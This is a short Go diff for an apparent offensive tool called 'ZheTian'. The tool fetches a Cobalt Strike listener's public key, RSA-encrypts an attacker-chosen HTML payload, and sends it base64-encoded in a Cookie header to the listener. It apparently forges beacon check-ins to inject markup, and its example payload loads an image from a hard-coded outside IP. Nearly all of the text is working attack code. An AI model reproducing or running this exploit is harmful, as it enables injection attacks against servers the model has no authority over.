@@ -11,7 +11,9 @@ import (
 
 func main() {
 
-	listen := flag.String("l", "", "CobaltStrike Http listen url")                         //HTTP监听地址，如 http://127.0.0.1:8100
+	fmt.Println("ZheTian..... github.com/yqcs")
+
+	listen := flag.String("u", "", "CobaltStrike Http listen url")                         //HTTP监听地址，如 http://127.0.0.1:8100
 	payload := flag.String("p", "", "payload,em: <img src=http://124.70.40.185/logo.png>") //payload，如 <html><img src=http://127.0.0.1/log.png> 不宜过长
 	flag.Parse()
 	if *listen == "" || *payload == "" {
@@ -21,7 +23,7 @@ func main() {
 	//公钥
 	publicKey := `
 -----BEGIN PUBLIC KEY-----
-` + utils.GetPublicKey(*listen) + `
+` + utils.Beaconinit(*listen) + `
 -----END PUBLIC KEY-----`
 
 	//poc
@@ -43,8 +45,7 @@ func main() {
 	//payload经过base64加密之后添加至cookie
 	request.Header.Add("Cookie", base64.StdEncoding.EncodeToString(rsaData))
 	do, err := http.DefaultClient.Do(request)
-	if err != nil {
-		return
+	if err == nil && do.StatusCode == 200 {
+		fmt.Println("Success")
 	}
-	fmt.Println(do.StatusCode)
 }
